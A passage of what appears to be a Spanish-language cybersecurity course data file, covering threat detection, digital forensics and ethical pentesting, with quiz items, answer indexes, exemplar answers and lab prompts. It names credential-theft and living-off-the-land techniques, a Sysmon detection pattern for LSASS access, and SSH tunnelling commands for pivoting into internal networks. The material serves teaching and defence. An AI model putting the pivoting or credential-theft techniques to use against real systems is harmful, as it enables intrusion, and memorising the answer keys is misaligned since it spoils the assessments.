          'Sigma es para los archivos de log lo que Snort/Suricata es para el tráfico de red y YARA para los archivos: un lenguaje universal de detección.',
        commonMisconception: 'Confundir Sigma (detección en logs de SIEM) con YARA (búsqueda de patrones en archivos/memoria).',
      },
      {
        id: 'ar-09-5',
        question: '¿En qué consiste una técnica **Living off the Land (LotL / LOLBins)** y por qué dificulta la detección tradicional?',
        options: [
          'En que el atacante utiliza binarios legítimos y firmados del propio sistema operativo (`curl`, `powershell.exe`, `certutil.exe`, `bash`) para descargar o ejecutar payloads sin depositar malware obvio en disco.',
          'En atacar únicamente servidores agrícolas.',
          'En apagar el suministro eléctrico del centro de datos.',
          'En usar exclusivamente exploits de kernel Zero-Day.',
        ],
        correctIndex: 0,
        explanation:
          'Como los binarios (`curl`, `powershell`, `rundll32`) están firmados por el fabricante del sistema operativo, un antivirus basado solo en firmas de archivos no los bloquea; se requiere monitorear la línea de comandos (`CommandLine`) y el árbol padre-hijo.',
        commonMisconception: 'Confiar en que si un ejecutable está firmado por Microsoft o viene en Ubuntu no puede ser usado maliciosamente.',
      },
    ],
    transferScenarioQuestion: {
      id: 'tr-09-1',
      question: 'ESCENARIO DE TRANSFERENCIA: Escribes una regla en tu SIEM para detectar robo de credenciales que busca `CommandLine contains "mimikatz.exe"`. Durante un ejercicio de Red Team, el adversario renombra la herramienta a `auditoria_red.exe` o la carga en memoria desde PowerShell y roba todas las contraseñas sin disparar tu alerta. ¿Cómo debes rediseñar la regla subiendo a la cima de la Pirámide del Dolor?',
      options: [
        'Agregar también el nombre `auditoria_red.exe` a la lista negra.',
        'Detectar el comportamiento técnico (TTP MITRE T1003.001): alertar ante cualquier proceso no autorizado en **Sysmon Event ID 10 (`ProcessAccess`)** que solicite un handle de lectura (`GrantedAccess: 0x1010` o `0x1fffff`) sobre `TargetImage: *\\lsass.exe`.',
        'Bloquear el puerto 80 en el firewall.',
        'Desinstalar Sysmon para reducir el volumen de logs.',
      ],
      correctIndex: 1,
      explanation:
        'Sin importar cómo llame el atacante a su ejecutable o si lo inyecta en memoria, para extraer credenciales de LSASS necesita abrir el proceso `lsass.exe`, lo cual queda registrado en Sysmon Event ID 10.',
      commonMisconception: 'Depender de nombres de archivo o hashes estáticos en lugar de monitorear el recurso crítico al que accede la técnica.',
    },
    selfExplanationPrompt: {
      question:
        'Explica cómo investigarías una alerta en un servidor Linux donde se sospecha compromiso por SSH: qué archivos de registro revisarías, cómo distinguirías fuerza bruta fallida de un acceso exitoso y qué pasos de contención aplicarías.',
      guidingSubQuestions: [
        '¿Qué cadenas clave buscarías en `/var/log/auth.log`?',
        'Una vez identificada la IP atacante y el binario descargado en `/tmp`, ¿cómo aíslas la amenaza sin destruir la evidencia forense?',
      ],
      keyTerms: ['auth.log', 'accepted', 'failed', 'hash', 'firewall'],
      exemplarAnswer:
        'Primero inspecciono /var/log/auth.log buscando secuencias de "Failed password" seguidas de un evento "Accepted password" o "Accepted publickey" desde la misma dirección IP origen. Luego correlaciono las entradas de sudo o creación de procesos posteriores a ese timestamp para identificar artefactos descargados (como en /tmp). Calculo el hash SHA-256 del binario para preservar la evidencia y extraer indicadores con strings, y finalmente aplico contención inmediata bloqueando la IP del C2 en el firewall (ufw/iptables) y revocando la clave comprometida.',
    },
    deliberatePractice: {
      prompt:
        'Inspecciona `cat auth.log` en la terminal para reconstruir la intrusión desde `203.0.113.42` y obtener la bandera de caza de amenazas.',
      scenario: 'Eres el analista principal del SOC. Debes identificar la intrusión en `auth.log` y el comando ejecutado por la cuenta comprometida.',
      starterCommandOrCode: 'cat auth.log',
      expectedPatterns: ['auth.log', 'grep', 'cat'],
      hint: 'Ejecuta `cat auth.log` en la terminal interactiva.',
      feedbackSuccess:
        'Análisis SOC impecable. Has correlacionado el registro de autenticación SSH con la ejecución de `sudo curl` y capturado la bandera del módulo.',
      feedbackError: 'Inspecciona `auth.log` ejecutando `cat auth.log` en la terminal.',
    },
    knowledgeSummary: [
      'Diseña detecciones enfocadas en la cima de la Pirámide del Dolor (TTPs de MITRE ATT&CK) usando reglas Sigma y YARA.',
      'Correlaciona siempre eventos de identidad (`auth.log` / Event ID 4624), ejecución de procesos (`auditd` / Sysmon ID 1) y red (Sysmon ID 3 / Zeek).',
      'El ciclo de Respuesta a Incidentes (NIST SP 800-61) comprende: Preparación -> Detección y Análisis -> Contención, Erradicación y Recuperación -> Lecciones Aprendidas (Post-Mortem).',
    ],
    spanishVideos: [
      {
        title: 'MITRE ATT&CK Enterprise Matrix — Tactics, Techniques & Mitigations',
        author: 'The MITRE Corporation',
        duration: 'Matriz Interactiva',
        url: 'https://attack.mitre.org/matrices/enterprise/',
        focus: 'Catálogo mundial de tácticas y técnicas de adversarios con guías de detección para SOC.',
      },
      {
        title: 'Sigma HQ — Open Signature Format for SIEM Systems',
        author: 'SigmaHQ Community',
        duration: 'Repositorio Oficial',
        url: 'https://sigmahq.io/',
        focus: 'Documentación y reglas abiertas de detección para Linux, Windows y Cloud.',
      },
    ],
    officialDocs: [
      {
        title: 'MITRE ATT&CK Enterprise Matrix',
        organization: 'The MITRE Corporation',
        url: 'https://attack.mitre.org/',
        type: 'Estándar Oficial',
      },
      {
        title: 'NIST SP 800-61 Rev. 2 — Computer Security Incident Handling Guide',
        organization: 'NIST',
        url: 'https://csrc.nist.gov/pubs/sp/800/61/r2/final',
        type: 'Estándar Oficial',
      },
    ],
    linkedLabId: 'lab-blueteam-siem',
  },
  {
    id: 'mod-10',
    number: '10',
    title: 'Análisis Forense Digital y Respuesta a Incidentes (DFIR)',
    tier: 'Avanzado / Senior',
    domain: 'Forense DFIR',
    estimatedHours: 16,
    summary:
      'Domina la ciencia forense digital: Orden de Volatilidad (RFC 3227), cadena de custodia, adquisición y análisis de memoria RAM con Volatility 3, forense de sistemas de archivos (inodos, MFT, archivos borrados) y reconstrucción de línea temporal (Super Timeline).',
    objectives: [
      'Aplicar rigurosamente el Orden de Volatilidad (RFC 3227) durante la adquisición de evidencia para no destruir pruebas efímeras en RAM.',
      'Garantizar la admisibilidad técnica y legal mediante Cadena de Custodia, bloqueadores de escritura y verificación criptográfica SHA-256.',
      'Analizar volcados de memoria RAM con Volatility 3 (`pslist`, `pstree`, `netscan`, `malfind`) y realizar triaje estático seguro de binarios.',
    ],
    glossary: [
      {
        term: 'Orden de Volatilidad (RFC 3227)',
        definition: 'Principio forense que exige recolectar primero las evidencias más efímeras (CPU, RAM, conexiones activas) antes que el disco duro.',
      },
      {
        term: 'Cadena de Custodia',
        definition: 'Registro cronológico firmado con hashes SHA-256 que garantiza quién manipuló la evidencia y que no sufrió alteraciones.',
      },
      {
        term: '/proc/<PID>/exe',
        definition: 'Enlace simbólico del kernel Linux que permite recuperar el binario en ejecución desde memoria aunque haya sido borrado del disco con `rm`.',
      },
    ],
    predictionPrompt: {
      question: 'Predice antes de actuar: Te llaman de urgencia porque un servidor crítico muestra actividad de ransomware/implante en memoria. El gerente de TI quiere desenchufar el cable eléctrico inmediatamente. ¿Qué se perdería para siempre si lo apaga?',
      reveal: 'Se destruiría toda la Memoria RAM: las conexiones de red abiertas hacia el C2, los procesos inyectados sin archivo en disco, las claves de cifrado en memoria y los descriptores en `/proc/<PID>/exe`. Primero se aísla la red y se vuelca la RAM.',
    },
    theorySections: [
      {
        heading: '1. Orden de Volatilidad (RFC 3227) y Preservación de la Evidencia',
        content:
          'El error más grave ante un servidor comprometido es apagarlo inmediatamente tirando del cable de alimentación. Al apagar el equipo se destruye toda la evidencia residente en la memoria RAM: conexiones de red activas, procesos inyectados sin archivo en disco (Fileless Malware), claves de cifrado de ransomware en claro y comandos en ejecución. Según el RFC 3227, la recolección debe ir de lo más volátil a lo menos volátil: (1) Registros/Caché CPU, (2) Memoria RAM y tabla de rutas/ARP, (3) Sistemas de archivos temporales, (4) Disco duro persistente, (5) Logs remotos y copias de seguridad.',
        codeSnippet: `# Triaje forense inicial y preservación de integridad criptográfica
sha256sum /tmp/.systemd-sync
strings /tmp/.systemd-sync`,
      },
      {
        heading: '2. Forense de Memoria con Volatility 3 y Análisis de Artefactos de Disco',
        content:
          'En un volcado de memoria (`.raw` o `.lime`), Volatility 3 reconstruye las estructuras internas del kernel: `windows.pstree` / `linux.pstree` revela procesos huérfanos o camuflados; `netscan` / `sockstat` lista sockets abiertos al instante de la captura; y `malfind` detecta regiones de memoria con permisos `PAGE_EXECUTE_READWRITE` (`rwx`) típicas de inyección de código (Process Hollowing / Reflective DLL Injection).',
      },
    ],
    realWorldCase: {
      title: 'Detección de Implante en Memoria y Extracción de Configuración C2 sin Tocar Disco',
      context:
        'Durante un incidente en un servidor financiero, un atacante eliminó el binario original después de ejecutarlo (`rm /tmp/.beacon`), aunque el proceso seguía vivo en memoria RAM.',
      technicalRootCause:
        'En Linux, mientras un proceso mantenga abierto su descriptor, el ejecutable borrado sigue accesible en `/proc/<PID>/exe` y en la memoria volátil del sistema.',
      lesson:
        'Nunca reiniciar un sistema bajo investigación forense antes de adquirir la memoria RAM e inspeccionar `/proc/<PID>/exe` y `/proc/<PID>/fd`.',
    },
    diagramType: 'dfir-chain',
    diagramCaption:
      'Orden de Volatilidad (RFC 3227) y flujo de preservación de Cadena de Custodia en una investigación DFIR.',
    activeRecallQuestions: [
      {
        id: 'ar-10-1',
        question: 'Según el estándar RFC 3227 (Guidelines for Evidence Collection and Archiving), ¿qué debes recolectar PRIMERO al responder a un incidente en un servidor en ejecución donde se sospecha malware en memoria?',
        options: [
          'Las cintas de backup del año pasado.',
          'La memoria volátil (RAM) y el estado de las conexiones de red/procesos activos antes de apagar o desconectar el sistema.',
          'Formatear el disco duro e instalar el sistema operativo de nuevo.',
          'Apagar el servidor del botón físico para hacer una copia del disco duro.',
        ],
        correctIndex: 1,
        explanation:
          'La memoria RAM y las tablas de red activas son altamente volátiles y desaparecen de forma irreversible si el equipo se apaga o reinicia.',
        commonMisconception: 'Apagar inmediatamente una máquina comprometida destruyendo claves de cifrado, sockets activos e inyecciones en RAM.',
      },
      {
        id: 'ar-10-2',
        question: 'En Linux, si un atacante lanza un binario malicioso y luego ejecuta `rm` sobre el archivo en disco mientras el proceso sigue corriendo con PID 4120, ¿cómo puede el analista forense recuperar el binario exacto?',
        options: [
          'Es imposible recuperarlo una vez ejecutado `rm`.',
          'Reiniciando el servidor en modo seguro.',
          'Copiando el enlace simbólico `/proc/4120/exe` hacia un directorio de evidencia seguro antes de matar el proceso.',
          'Ejecutando `chmod 777 /tmp`.',
        ],
        correctIndex: 2,
        explanation:
          'En Linux, un archivo eliminado del directorio mantiene su inodo y bloques de datos activos mientras al menos un proceso lo tenga abierto; `/proc/<PID>/exe` apunta directamente al binario en memoria/inodo.',
        commonMisconception: 'Matar el proceso sospechoso con `kill -9` antes de volcar `/proc/<PID>/exe` y `/proc/<PID>/maps`.',
      },
      {
        id: 'ar-10-3',
        question: 'Al analizar un volcado de memoria RAM con **Volatility 3**, ¿qué plugin está diseñado específicamente para localizar regiones de memoria con permisos `rwx` (Lectura, Escritura y Ejecución) donde se haya inyectado shellcode o DLLs reflectivas?',
        options: [
          'windows.cmdline',
          'linux.bash',
          'windows.registry.hivelist',
          'malfind (`windows.malfind` / `linux.malfind`)',
        ],
        correctIndex: 3,
        explanation:
          '`malfind` inspecciona los descriptores de áreas de memoria virtual (VAD en Windows / VMA en Linux) buscando páginas privadas con permiso de ejecución y escritura simultánea o cabeceras MZ/ELF ocultas.',
        commonMisconception: 'Usar únicamente `pslist` sin revisar inyecciones de memoria en procesos legítimos con `malfind`.',
      },
      {
        id: 'ar-10-4',
        question: '¿Por qué un perito forense NUNCA monta ni analiza directamente el disco duro original del incidente, sino una imagen bit a bit verificada con `sha256sum`?',
        options: [
          'Porque montar un sistema de archivos sin bloqueador de escritura altera metadatos (como tiempos de acceso `atime` o el journal), invalidando la integridad de la prueba original.',
          'Porque los discos originales son más lentos.',
          'Porque Volatility no funciona en discos originales.',
          'Solo por costumbre administrativa sin razón técnica.',
        ],
        correctIndex: 0,
        explanation:
          'La reproducibilidad científica y legal exige que el soporte original permanezca inalterado (usando bloqueadores de escritura) y que toda prueba pueda demostrarse comparando el hash SHA-256 original con el de la copia forense.',
        commonMisconception: 'Abrir y explorar directamente el disco original desde un sistema operativo normal sin protección contra escritura.',
      },
      {
        id: 'ar-10-5',
        question: 'En la construcción de una **Super Timeline** forense sobre un sistema de archivos (ext4 o NTFS), ¿qué significan las siglas **MACB** de los timestamps de un archivo?',
        options: [
          'Memory, Address, CPU, Bus',
          'Modified (contenido modificado), Accessed (último acceso/lectura), Changed (cambio de metadatos/inodo/MFT), Birth (creación del archivo).',
          'Malware, Attack, Containment, Backup',
          'MAC Address Broadcast',
        ],
        correctIndex: 1,
        explanation:
          'Correlacionar los cuatro tiempos MACB permite detectar maniobras de *Timestomping* (cuando un atacante falsifica la fecha de modificación `M`, pero olvida que el cambio de inodo/MFT `C` revela el instante real).',
        commonMisconception: 'Fijarse únicamente en la fecha de modificación mostrada por `ls -l` sin revisar `stat <archivo>` (MACB completo).',
      },
    ],
    transferScenarioQuestion: {
      id: 'tr-10-1',
      question: 'ESCENARIO DE TRANSFERENCIA: Durante un análisis forense en Linux descubres un proceso sospechoso con PID `4120` que mantiene una conexión abierta hacia `203.0.113.42:4443`. Al buscar el ejecutable en `/tmp/.systemd-sync`, ves que el atacante acaba de borrarlo con `rm`. ¿Qué orden de acciones preserva la evidencia?',
      options: [
        'Ejecutar inmediatamente `kill -9 4120` y luego reiniciar el servidor para limpiar la RAM.',
        'Primero copiar el binario desde la memoria del kernel con `cp /proc/4120/exe /var/evidencia/implante.elf`, calcular su `sha256sum`, registrar las conexiones/maps de `/proc/4120/`, y SOLO DESPUÉS aislar y finalizar el proceso.',
        'Volver a descargar el malware haciendo clic en el enlace del atacante.',
        'Formatear la partición `/tmp`.',
      ],
      correctIndex: 1,
      explanation:
        'Si matas el proceso PID 4120 primero, el kernel cerrará el último descriptor abierto del inodo y los bloques del archivo borrado desaparecerán junto con `/proc/4120/exe`.',
      commonMisconception: 'Matar el proceso malicioso antes de rescatar `/proc/<PID>/exe` y la evidencia volátil.',
    },
    selfExplanationPrompt: {
      question:
        'Explica qué es la Cadena de Custodia en el análisis forense digital, por qué nunca se debe trabajar directamente sobre la evidencia original y cómo garantizas matemáticamente que tu copia de trabajo es idéntica a la original.',
      guidingSubQuestions: [
        '¿Qué rol cumplen los bloqueadores de escritura y las imágenes bit a bit (dd / E01 / LiME)?',
        '¿Qué demuestra la coincidencia del hash SHA-256 antes y después del análisis?',
      ],
      keyTerms: ['custodia', 'volatilidad', 'hash', 'sha256', 'copia'],
      exemplarAnswer:
        'La Cadena de Custodia es el registro cronológico y verificable que documenta quién recolectó, transportó, almacenó y analizó una evidencia digital. Nunca se analiza el soporte original porque cualquier lectura sin protección podría alterar metadatos o tiempos de acceso (atime), invalidando la prueba. En su lugar, se adquiere una imagen forense bit a bit (respetando el orden de volatilidad) y se calcula el hash criptográfico SHA-256 tanto del original como de la copia: si ambos hashes coinciden, queda demostrado matemáticamente que la evidencia no sufrió ninguna alteración.',
    },
    deliberatePractice: {
      prompt:
        'Calcula el hash de cadena de custodia con `sha256sum /tmp/.systemd-sync` y luego extrae las cadenas estáticas y la bandera forense con `strings /tmp/.systemd-sync`.',
      scenario: 'Necesitas documentar el hash SHA-256 del implante y extraer el servidor C2 y el identificador MUTEX sin ejecutar el binario.',
      starterCommandOrCode: 'strings /tmp/.systemd-sync',
      expectedPatterns: ['strings', 'sha256sum', '/tmp/.systemd-sync'],
      hint: 'Ejecuta `sha256sum /tmp/.systemd-sync` y luego `strings /tmp/.systemd-sync`.',
      feedbackSuccess:
        'Triaje estático completado con éxito. Extrajiste la configuración C2 (`203.0.113.42:4443`) y el mutex forense sin ejecutar el binario.',
      feedbackError: 'Utiliza `sha256sum /tmp/.systemd-sync` y `strings /tmp/.systemd-sync` en la terminal.',
    },
    knowledgeSummary: [
      'Respeta siempre el Orden de Volatilidad (RFC 3227): RAM y conexiones activas primero; disco persistente después.',
      'Trabaja exclusivamente sobre copias forenses verificadas con hashes SHA-256 documentados en la Cadena de Custodia.',
      'En Linux, `/proc/<PID>/exe`, `/proc/<PID>/fd` y `/proc/<PID>/environ` son minas de oro forenses mientras el proceso malicioso sigue activo.',
    ],
    spanishVideos: [
      {
        title: 'Volatility 3 Official Documentation — Memory Forensics Framework',
        author: 'The Volatility Foundation',
        duration: 'Manual Oficial',
        url: 'https://volatility3.readthedocs.io/en/latest/',
        focus: 'Referencia completa de plugins de análisis de memoria RAM para Linux y Windows.',
      },
      {
        title: 'RFC 3227 — Guidelines for Evidence Collection and Archiving',
        author: 'IETF Network Working Group',
        duration: 'Estándar RFC',
        url: 'https://datatracker.ietf.org/doc/html/rfc3227',
        focus: 'Orden de volatilidad, preservación de pruebas y cadena de custodia.',
      },
    ],
    officialDocs: [
      {
        title: 'RFC 3227 — Guidelines for Evidence Collection and Archiving',
        organization: 'IETF',
        url: 'https://datatracker.ietf.org/doc/html/rfc3227',
        type: 'RFC / Documentación',
      },
      {
        title: 'Volatility 3 Official Documentation — Memory Forensics Framework',
        organization: 'The Volatility Foundation',
        url: 'https://volatility3.readthedocs.io/en/latest/',
        type: 'Guía Técnica',
      },
    ],
    linkedLabId: 'lab-blueteam-siem',
  },
  {
    id: 'mod-11',
    number: '11',
    title: 'Pentesting Ético, Red Teaming y Post-Explotación',
    tier: 'Avanzado / Senior',
    domain: 'Pentesting Ético',
    estimatedHours: 20,
    summary:
      'Integra todos los dominios ofensivos bajo una metodología profesional (PTES / OSSTMM / OWASP WSTG): reglas de enfrentamiento (RoE), reconocimiento activo/pasivo, explotación, post-explotación, pivoting/tunneling, Active Directory y redacción de informes ejecutivos y técnicos.',
    objectives: [
      'Ejecutar cada fase de un Pentest profesional respetando estrictamente el Alcance (Scope) y las Reglas de Enfrentamiento (RoE) autorizadas.',
      'Realizar técnicas de Pivoting y Port Forwarding (SSH Local/Dynamic Socks Proxy, Chisel/Ligolo-ng) para auditar subredes internas aisladas.',
      'Redactar informes de auditoría de nivel Senior que traduzcan hallazgos técnicos en riesgo de negocio y planes de remediación accionables.',
    ],
    glossary: [
      {
        term: 'Pivoting',
        definition: 'Técnica post-explotación que utiliza un servidor comprometido como puente para enrutar tráfico hacia subredes internas aisladas.',
      },
      {
        term: 'SSH Local Port Forwarding (-L)',
        definition: 'Túnel que vincula un puerto de tu máquina local con un puerto accesible desde el servidor SSH remoto (`-L local:dest:dest_port`).',
      },
      {
        term: 'SSH Dynamic Proxy (-D)',
        definition: 'Abre un servidor proxy SOCKS local que permite enrutar cualquier herramienta TCP a través del túnel SSH.',
      },
    ],
    predictionPrompt: {
      question: 'Predice antes de crear el túnel: Si en el servidor `10.10.10.45` una base de datos escucha solo en `127.0.0.1:5432`, ¿por qué un escaneo `nmap` desde tu máquina hacia `10.10.10.45` no ve el puerto 5432?',
      reveal: 'Porque `127.0.0.1` es la interfaz loopback interna del propio servidor: el kernel descarta cualquier paquete que llegue desde la tarjeta de red externa hacia ese socket. Solo si ya estás dentro del servidor (o creas un túnel SSH `-L`) puedes conectarte a su `127.0.0.1:5432`.',
    },
    theorySections: [
      {
        heading: '1. Metodología PTES, Reglas de Enfrentamiento (RoE) y Pivoting de Red',
        content:
          'La diferencia entre un atacante ilegal y un Pentester Senior radica en la autorización escrita, el control del impacto y el rigor metodológico (PTES: Pre-engagement, Intelligence Gathering, Threat Modeling, Vulnerability Analysis, Exploitation, Post-Exploitation y Reporting). Durante la post-explotación, cuando un servidor comprometido tiene acceso a una segunda tarjeta de red interna (por ejemplo `172.16.50.0/24`) o servicios ligados a `127.0.0.1`, el pentester utiliza túneles SSH (`ssh -D 1080` o `ssh -L`) para enrutar herramientas de auditoría a través del host pivote.',
        codeSnippet: `# Creación de un túnel SOCKS5 dinámico por SSH para auditar una subred interna autorizada
ssh -N -D 127.0.0.1:1080 auditor@10.10.10.45
# Reenvío de puerto local (Local Port Forwarding) hacia un servicio interno en 127.0.0.1:5432
ssh -N -L 127.0.0.1:15432:127.0.0.1:5432 auditor@10.10.10.45`,
      },
      {
        heading: '2. El Entregable Más Importante del Pentester: El Informe Ejecutivo y Técnico',
        content:
          'Una explotación brillante no tiene valor para el cliente si el informe es confuso. Todo informe Senior se divide en dos capas: (1) Resumen Ejecutivo (dirigido al CISO y directorio: impacto en el negocio, riesgo estratégico y hoja de ruta de inversión) y (2) Detalle Técnico Reproducible (evidencia paso a paso, vector CVSS, causa raíz arquitectónica y fragmento de código o configuración exacta para mitigar el fallo).',
      },
    ],
    realWorldCase: {
      title: 'Cadena de Explotación Completa (Attack Chain): De Servicio Web Expuesto a Compromiso de Red Interna',
      context:
        'Durante un ejercicio de Red Team autorizado, ninguna vulnerabilidad aislada era crítica por sí sola, pero el encadenamiento de tres fallos menores permitió alcanzar la base de datos interna.',
      technicalRootCause:
        'Encadenamiento de (1) API de depuración expuesta en puerto 8080 -> (2) Reutilización de credenciales en SSH -> (3) Pivoting SSH hacia un servicio interno en `127.0.0.1:5432` sin autenticación robusta.',
      lesson:
        'Evaluar las vulnerabilidades en el contexto de rutas de ataque completas (Attack Paths) y aplicar defensa en profundidad en cada salto.',
    },
    diagramType: 'pentest-killchain',
    diagramCaption:
      'Ciclo PTES completo: Reconocimiento -> Explotación -> Escalada de Privilegios -> Pivoting a Subred Interna -> Remediación e Informe.',
    activeRecallQuestions: [
      {
        id: 'ar-11-1',
        question: 'Durante un pentest autorizado en `10.10.10.45`, descubres que PostgreSQL escucha únicamente en la interfaz loopback local (`127.0.0.1:5432`) del servidor remoto. ¿Qué comando SSH te permite acceder a ese puerto desde tu máquina local en el puerto `15432`?',
        options: [
          'ssh -N -L 127.0.0.1:15432:127.0.0.1:5432 auditor@10.10.10.45',
          'ssh -R 80:80 auditor@10.10.10.45',
          'ping -p 5432 10.10.10.45',
          'scp 10.10.10.45:5432 .',
        ],
        correctIndex: 0,
        explanation:
          'El modificador `-L [bind_address:]puerto_local:host_remoto:puerto_remoto` crea un túnel de Local Port Forwarding que redirige las conexiones hechas a tu `127.0.0.1:15432` a través del túnel SSH hacia el `127.0.0.1:5432` interno del servidor.',
        commonMisconception: 'Intentar conectarse directamente desde fuera a un puerto ligado a `127.0.0.1` o modificar el firewall del cliente en producción para exponer la base de datos a toda la red.',
      },
      {
        id: 'ar-11-2',
        question: '¿Qué acción debe tomar inmediatamente un Pentester Ético si durante una prueba autorizada descubre evidencias de un compromiso activo previo por parte de un actor malicioso real (por ejemplo, un webshell o ransomware en preparación)?',
        options: [
          'Borrar el malware en silencio y no mencionarlo en el informe.',
          'Detener las pruebas sobre ese activo, preservar la evidencia y notificar de inmediato al contacto de emergencia del cliente según el protocolo de escalamiento de las Reglas de Enfrentamiento (RoE).',
          'Atacar al servidor del actor malicioso sin autorización.',
          'Publicar el hallazgo en redes sociales.',
        ],
        correctIndex: 1,
        explanation:
          'Ante el hallazgo de un incidente real en curso o una vulnerabilidad crítica que ponga en peligro inminente la operación, la ética profesional y el PTES exigen pausar la actividad en ese sistema y alertar inmediatamente al cliente para activar su respuesta a incidentes.',
        commonMisconception: 'Esperar dos semanas hasta la entrega final del informe para avisar de una brecha activa o vulnerabilidad crítica.',
      },
      {
        id: 'ar-11-3',
        question: '¿Qué bandera de SSH (`-L`, `-R` o `-D`) levanta un servidor proxy dinámico **SOCKS5** local para poder enrutar múltiples herramientas (con `proxychains4`) hacia toda una subred interna?',
        options: [
          '-L (Local Port Forwarding de un único puerto)',
          '-R (Remote Port Forwarding)',
          '-D (Dynamic application-level port forwarding / SOCKS proxy)',
          '-v (Verbose mode)',
        ],
        correctIndex: 2,
        explanation:
          '`ssh -N -D 127.0.0.1:1080 user@pivote` abre un proxy SOCKS en el puerto 1080 que reenvía dinámicamente conexiones TCP hacia cualquier IP y puerto alcanzable por el host pivote.',
        commonMisconception: 'Crear decenas de túneles `-L` manuales cuando se necesita auditar múltiples hosts y puertos de una subred interna.',
      },
      {
        id: 'ar-11-4',
        question: '¿Qué directiva en `/etc/ssh/sshd_config` debe configurar el equipo defensivo (Blue Team) en servidores bastión o de aplicación donde no se desea permitir que los usuarios creen túneles de reenvío de puertos TCP?',
        options: [
          'PermitRootLogin yes',
          'PasswordAuthentication yes',
          'Port 2222',
          'AllowTcpForwarding no (junto con PermitTunnel no)',
        ],
        correctIndex: 3,
        explanation:
          '`AllowTcpForwarding no` instruye al demonio OpenSSH (`sshd`) a rechazar solicitudes de creación de canales `-L`, `-R` y `-D`, frenando el uso de SSH como proxy de pivoting.',
        commonMisconception: 'Dejar la configuración por defecto de `sshd` (`AllowTcpForwarding yes`) en servidores donde las cuentas solo necesitan ejecutar un comando específico.',
      },
      {
        id: 'ar-11-5',
        question: 'En un Informe de Pentesting de nivel Senior, ¿cuál es la diferencia esencial entre el Resumen Ejecutivo y el Anexo Técnico?',
        options: [
          'El Resumen Ejecutivo traduce los hallazgos técnicos en impacto de negocio, riesgo estratégico y prioridades de inversión para la dirección; el Anexo Técnico detalla los pasos de reproducción, vectores CVSS, causa raíz y parches exactos para ingeniería.',
          'El Resumen Ejecutivo contiene solo capturas de pantalla de la terminal sin texto.',
          'El Anexo Técnico no incluye cómo solucionar las vulnerabilidades.',
          'Son exactamente el mismo texto copiado dos veces.',
        ],
        correctIndex: 0,
        explanation:
          'Ambos públicos toman decisiones distintas: la alta dirección aprueba presupuesto y ventanas de cambio entendiendo el riesgo de negocio, mientras que el equipo de ingeniería necesita evidencia reproducible y código/configuración de remediación.',
        commonMisconception: 'Entregar un listado crudo de salida de escáneres sin contexto de negocio ni pasos claros de remediación.',
      },
    ],
    transferScenarioQuestion: {
      id: 'tr-11-1',
      question: 'ESCENARIO DE TRANSFERENCIA: Durante un pentest cuyo Alcance (Scope) autoriza auditar `10.10.10.0/24`, descubres en un archivo de configuración credenciales que dan acceso a un servidor en `192.168.99.15` (un rango IP que NO figura en el documento de Scope firmado). ¿Cuál es el procedimiento correcto?',
      options: [
        'Conectarte inmediatamente a `192.168.99.15` para ver hasta dónde llegas antes de avisar.',
        'Documentar el hallazgo de las credenciales en `10.10.10.x`, NO tocar `192.168.99.15` porque está fuera del Scope firmado, y consultar al punto de contacto del cliente por si desean ampliar formalmente el alcance por escrito.',
        'Escanear `192.168.99.15` con Nmap usando velocidades lentas para no ser visto.',
        'Ignorar las credenciales y no mencionarlas en el informe.',
      ],
      correctIndex: 1,
      explanation:
        'Un activo fuera del Scope firmado puede pertenecer a un tercero, a un proveedor externo o a un entorno regulado crítico; jamás se interactúa con una IP fuera del alcance sin una adenda escrita.',
      commonMisconception: 'Suponer que encontrar credenciales dentro de un servidor en alcance da permiso automático para atacar cualquier IP a la que apunten.',
    },
    selfExplanationPrompt: {
      question:
        'Explica cómo estructurarías la explicación de una vulnerabilidad crítica en un informe de Pentesting para que tanto el Director Financiero (CEO/CFO) como el Ingeniero de Sistemas entiendan qué ocurre y cómo solucionarlo.',
      guidingSubQuestions: [
        '¿Qué lenguaje y métricas necesita el nivel ejecutivo frente al nivel técnico?',
        '¿Por qué una recomendación como "actualizar o asegurar el sistema" es insuficiente en un informe profesional?',
      ],
      keyTerms: ['impacto', 'riesgo', 'evidencia', 'remediacion', 'ejecutivo'],
      exemplarAnswer:
        'En la sección ejecutiva traduzco el fallo técnico a riesgo de negocio: qué activos críticos o datos regulados están expuestos, cuál sería el impacto operativo o financiero de una brecha y qué prioridad tiene en la hoja de ruta. En la sección técnica documento la evidencia reproducible paso a paso (comandos, peticiones HTTP y capturas), explico la causa raíz del problema y entrego una solución de remediación específica y accionable (por ejemplo, el comando exacto para revocar el bit SUID o el código refactorizado con consultas parametrizadas).',
    },
    deliberatePractice: {
      prompt:
        'Establece el túnel de pivoting ejecutando `ssh -N -L 127.0.0.1:15432:127.0.0.1:5432 auditor@10.10.10.45` en la terminal.',
      scenario: 'En un pentest real debes demostrar cómo alcanzar el motor PostgreSQL interno ligado a `127.0.0.1:5432` mediante un túnel SSH.',
      starterCommandOrCode: 'ssh -N -L 127.0.0.1:15432:127.0.0.1:5432 auditor@10.10.10.45',
      expectedPatterns: ['ssh', '-L', '15432', '5432', '10.10.10.45'],
      hint: 'Ejecuta `ssh -N -L 127.0.0.1:15432:127.0.0.1:5432 auditor@10.10.10.45` en la terminal.',
      feedbackSuccess:
        'Excelente ejecución. Has establecido el túnel de reenvío de puertos local y capturado la bandera de pivoting.',
      feedbackError: 'Usa `ssh -N -L 127.0.0.1:15432:127.0.0.1:5432 auditor@10.10.10.45`.',
    },
    knowledgeSummary: [
      'Jamás ejecutes pruebas contra activos fuera del alcance escrito (Scope) ni sin autorización firmada.',
      'Domina el Pivoting por SSH (`-L`, `-R`, `-D`) y túneles de red para evaluar la seguridad real de redes internas segmentadas.',
      'El informe de auditoría es el producto final del pentest: debe incluir causa raíz y remediación técnica verificable.',
    ],
    spanishVideos: [
      {
        title: 'OWASP Web Security Testing Guide (WSTG v4.2)',
        author: 'OWASP Foundation',
        duration: 'Estándar Completo',
        url: 'https://owasp.org/www-project-web-security-testing-guide/latest/',
        focus: 'Metodología exhaustiva de pruebas de penetración y reporte técnico.',
      },
      {
        title: 'OpenSSH Manual — ssh(1) Port Forwarding (-L, -R, -D)',
        author: 'OpenBSD / OpenSSH Project',
        duration: 'Documentación Oficial',
        url: 'https://man.openbsd.org/ssh',
        focus: 'Referencia técnica de túneles locales, remotos, proxies SOCKS y directivas de seguridad.',
      },
    ],
    officialDocs: [
      {
        title: 'PTES — Penetration Testing Execution Standard',
        organization: 'PTES Technical Guidelines',
        url: 'http://www.pentest-standard.org/index.php/Main_Page',
        type: 'Estándar Oficial',
      },
      {
        title: 'OWASP Web Security Testing Guide (WSTG v4.2)',
        organization: 'OWASP Foundation',
